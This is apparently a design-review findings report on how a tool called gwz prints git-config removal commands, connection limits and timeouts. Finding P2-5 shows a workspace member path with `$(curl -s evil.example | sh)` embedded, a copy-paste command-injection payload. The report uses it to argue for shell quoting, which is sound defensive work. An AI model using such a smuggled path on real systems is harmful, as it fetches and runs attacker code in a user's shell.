## 1. Findings

### [P2-5] The removal commands and notes embed a workspace-supplied path unquoted and unescaped, and tell the user to paste them

- **Root cause.** §10 freezes `remove it with git config --file <file> --unset gwz.transport` in the native-selected note, the ignored-value note, the gwz-py warning and `logging` record, the gwz-py CLI lines and the file refusals, with `<file>` inserted bare. §10's one escaping rule ("A shown value is escaped as `GWZ_URL_SCHEME`'s message escapes it") covers `<value>`, and its examples show bare paths (`skipped unreadable /home/u/.gitconfig`). For an ignored value, `<file>` is `<root>/<member path>/.git/config` or `…/config.worktree`, and `<scope>` carries the member ID; the member path and ID come from the workspace manifest, which the workspace's `MemberPath::parse` admits with any character but a path separator rule (`src/workspace/mod.rs:13-49`), spaces, `$(`, backticks, `;`, quotes and newlines included.
- **Location.** §10 "Removal commands", "The note" (third line), "An ignored value", "Refusals" (the two `--file` refusals), the gwz-py bullets and the gwz-py CLI lines; §3's threat model ("Others write a workspace, and share it").
- **Violated invariant.** §3's premise that a workspace value is ignored by construction and can cost the user nothing; the design's own instruction that these commands are the user's remedy.
- **Interleaving.** (a) Non-adversarial: a workspace at `/Users/me/My Projects/ws` with `gwz.transport` in its root `.git/config`; the note gives `git config --file /Users/me/My Projects/ws/.git/config --unset gwz.transport`; pasted, git reads `--file /Users/me/My` and fails on the extra operand, or worse treats it as a key. (b) Adversarial: a shared workspace's manifest lists a member at `tools/x$(curl -s evil.example | sh)` whose `.git/config` holds `gwz.transport = native`; any user's `gwz fetch` prints `gwz: note: ignoring gwz.transport = "native" in /ws/tools/x$(curl -s evil.example | sh)/.git/config (member …): … remove it with git config --file /ws/tools/x$(curl -s evil.example | sh)/.git/config --unset gwz.transport`; the user pastes the remedy the tool gave and the substitution runs as them. (c) A member path or ID containing a newline splits the note into two lines, the second forgeable as a `gwz: ` refusal or another note, since only `<value>` is escaped.
- **Impact.** A frozen user-facing command that breaks on a common path, and a copy-paste command-injection vector from a shared workspace through gwz's own advice. The same manifest access already allows hooks, so this is not a new trust boundary, but it is a new, designed channel into the user's shell.
- **Required correction.** §10 states a rule for paths and identifiers distinct from the value rule: in every command, `<file>` is POSIX-shell single-quoted (`'…'`, an embedded `'` written `'\''`) and, on Windows, double-quoted (TR1.8 may refine it); in every note, line and JSON-free string, `<file>` and the member ID are shown with control characters escaped as `<value>` is, so one entry is one line. The gwz-py strings follow the same rule.
- **Closure test.** gwz-cli and gwz-py rows: a targeted member at a path containing a space and `$(` holding the key — the note's command, run through `sh -c`, removes the key and executes nothing else; a member ID and a member path each containing a newline produce one note line each, escaped; the rendered strings equal §10.

### [P3-3] The removal command fails, exit 5, in two cases the design itself admits

- **Root cause.** `git config --file <file> --unset gwz.transport` succeeds only when that file holds exactly one `gwz.transport` line; §2 admits several ("Within a file the last value wins"), and §2 and §10 admit that `file` names the including file when the value came through `include.path` (deviation 4).
- **Location.** §10 "Removal commands" ("which removes the key from that file whichever it is"), the five commands that embed it; §2 "`file`".
- **Evidence.** git 2.52's manual: `unset` "refuses to unset multi-valued keys" (ret=5); "you try to unset an option which does not exist (ret=5)"; with `--file`, `--includes` defaults to off, so a key held only in an included file "does not exist" for `--unset`. libgit2 sets `origin_path` on every entry (`config_file.c:812-813`); git2-rs's `ConfigEntry` omits the accessor while the fork's `libgit2-sys` already declares the field (`libgit2-sys/lib.rs:1004`), so the limit is a one-accessor choice in a crate the program owns (TR3.3's `gwz-git2`).
- **Consequence.** The user runs the given remedy, gets "key has multiple values" or "key not found", and in the include case `grep gwz.transport <file>` finds nothing; `--verbose` and `file` point at a file that does not hold the key.
- **Required correction.** The commands use `--unset-all`, which also removes a single value; and either the fork exposes `origin_path` so `file` names the file that held the value (recommended; the §2 and §10 sentences on the including file then go), or the include case is named in the message ("in <file> or a file it includes") with `git config --global --show-origin --get-all gwz.transport` as the locating command.
- **Closure test.** gwz-core unit rows: two `gwz.transport` lines in `~/.gitconfig`, and the value held in an included file; in each, the command the note gives, run as given, removes the key, and `file` names the file that held it (or the message names the include case).

### [P3-4] `Client(max_connections_per_host=32)` silently runs at 8 with native selected, where 1.0.17 sent 32

- **Root cause.** gwz-py's `Client` defaults `max_connections_per_host` to the literal 32 and forwards it only when it differs (`client.py:193, 294-295`), so an explicit 32 is indistinguishable from the default; §6 documents the override instead of removing the ambiguity. At `v1.0.17` the parameter defaulted to `None` (`client.py:201`) and an explicit 32 was sent and honoured.
- **Location.** §6 "gwz-py's limits", last sentence; §9's gwz-py defaults row.
- **Consequence.** A caller who asks for 32 gets 8 on the native transport, with no message; the direction is fewer connections, so it is safe against `MaxStartups`, but it is an explicit value not honoured, and a regression against 1.0.17's own signature, which amendment 2 §3.1 says 1.1.0 leaves unchanged.
- **Required correction.** The design directs TR2.5 to restore `None` as the constructor default (1.0.17's spelling) or a sentinel, so that any value the caller passes is sent, and removes the documented override. If the operator keeps the override, §6 must say the value is replaced, not merely "cannot be told".
- **Closure test.** gwz-py row: `Client(max_connections_per_host=32)` with native selected sends 32 and the fixture sees up to 32 concurrent connections; `Client()` sends nothing and runs at 8.

### [P3-5] §6's gwz-py advice sets one process clock that also governs the transport's stall

- **Root cause.** `configure_transport_runtime` is one process-wide value with two meanings: libgit2's connect and read timeout on the native transport, and the per-attempt stall clock the transport's runtime reads at its start (Python design §1 and §2.2; retry plan §7 `apply_native_timeout`). §6 tells an application that wants 1.0.17's 3 s to call it before its first operation without saying it also drops the transport's stall from 9 s to 3 s for every `gwz`-routed operation in that process, which the retry plan raised for the slow-login tail; and §2 lets a process toggle routes per operation.
- **Location.** §6 "gwz-py's limits" ("An application that wants 1.0.17's 3 seconds sets it before its first operation…"); §5's ledger bullet "with gwz-py's timeout exception".
- **Consequence.** A process that follows the advice and mixes routes gets 3 s stalls on the transport, retried up to the budget, where it expected 9 s; a login that passes at 9 s can fail at 3 s. The user chose the value, but on the design's advice and without the caveat.
- **Required correction.** One sentence in §6: the value is the process's one clock for both transports, so a process that uses both chooses one value for both; the ledger and migration notes carry it. This is a pre-existing architectural fact (the `permanent` globals entry), not a new root cause, and 1.1.0 cannot change it.
- **Closure test.** gwz-py row: after `configure_transport_timeout(3)`, a `gwz`-routed operation against the silent fixture fails each attempt after about 3 s; the documentation sentence is present.

## 2. Invariant analysis

- **Who can flip it.** Unchanged from round 1 and still safe: only the flag, the variable and the user's global files decide; relative or empty `HOME`, relative `XDG_CONFIG_HOME`, `GIT_CONFIG_GLOBAL`, the command scope and system files name nothing; `includeIf` is skipped; an unreadable file now yields no value (the safe direction, since nothing an attacker can make unreadable turns native on); a workspace or repository value is read only in the request's targets, never checked, and can neither refuse (D1) nor block (D6) a request. What a workspace value can now do is place text into the user's shell (P2-5).
- **Never a fallback.** No change: resolution precedes any connection in both drivers and at `open` in 1.2.0; the policy and timeout fills happen at resolution, before any backend; nothing re-dispatches. The hint names `native` only in TR1.6's and TR1.8's refusals.
- **Degraded and mixed paths.** The CLI now sets libgit2's timeout after `invocation_from_cli`, which creates no backend; the resolver's `git2::Config::open` initialises libgit2 but freezes nothing, so `set_server_timeout_ms`'s `expect` cannot fire. In gwz-py the native entry rewrites the request's policy only when it decoded it, which it already did to find the operation in scope. A `GWZ_TRANSPORT=native` script on 1.0.17 is inert; `--transport` on 1.0.17 is a usage error. OD16's text is unchanged and claims no lessening.
- **1.2.0.** The 3 s CLI default under `auto` keys a separate server per timeout value (server design line 236), a cost not a hazard; at an explicit address a default server refuses a native client's operations on the timeout row, which §8 states and OQ3(d) carries to the operator. The host still never derives the value.
- **gwz-py.** The native-selected warning under `error` now surfaces as a `GwzBridgeError` with the warning as `__cause__` (bridge wrappers catch `Exception`); the `logging` carrier for notes cannot raise; the scan and file reads run off the GIL, so a second thread progresses; cancellation, `close()` and exit are as before.
- **"Never worse than the status quo."** Holds for the route, host keys, credentials, the CLI's defaults, and now the unreadable-file case. The two residual deviations are documented and lenient (gwz-py's 9 s libgit2 timeout) or safe-direction (P3-4's 8 for an explicit 32); P3-4 and P3-5 ask for the honest statement or the small fix.
